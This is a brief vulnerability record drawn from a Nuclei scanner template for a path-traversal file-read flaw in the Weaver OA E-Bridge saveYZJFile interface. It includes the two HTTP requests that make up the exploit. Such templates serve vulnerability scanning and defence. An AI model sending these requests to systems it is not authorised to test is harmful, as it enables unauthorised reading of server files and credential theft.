# Nuclei Template: Weaver E-Bidge saveYZJFile - Local File Read
**Template ID:** weaver-ebridge-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`weaver-ebridge-lfi.yaml`)

## Vulnerability Information & PoC

## Description
There is an arbitrary file reading vulnerability in the Weaver OA E-Bridge saveYZJFile interface. An attacker can read any file on the server through the vulnerability.

## Steps to reproduce / Exploit Payload
```http
GET /wxjsapi/saveYZJFile?fileName=test&downloadUrl={{path}} HTTP/1.1
Host: {{Hostname}}

GET /file/fileNoLogin/{{idname}} HTTP/1.1
Host: {{Hostname}}
```

## References
- https://peiqi.wgpsec.org/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Bridge%20saveYZJFile%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html
